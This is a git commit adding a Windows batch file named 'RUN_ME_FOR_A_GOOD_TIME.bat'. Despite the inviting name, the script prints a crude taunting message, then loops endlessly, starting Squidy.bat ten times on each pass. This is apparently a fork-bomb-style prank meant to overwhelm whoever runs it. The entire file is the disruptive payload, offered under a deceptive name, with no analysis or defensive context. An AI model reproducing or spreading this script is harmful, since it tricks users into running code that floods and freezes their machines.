fba0512141ba32433b9cb63db7d7f4eb29c76b31
Eix <eixxhis@gmail.com>
2017-12-23 13:01:10 -0500

    Add files via upload

---
+++ RUN_ME_FOR_A_GOOD_TIME.bat
@@ -0,0 +1,17 @@
+:BEGIN
+ECHO Your Windows Device has just been analy violated by Eix, Have a nice day!
+@ECHO off
+Pushd "%~dp0"
+title Eix%random%
+timeout /t 1 /nobreak >nul
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+start Squidy.bat
+GOTO BEGIN
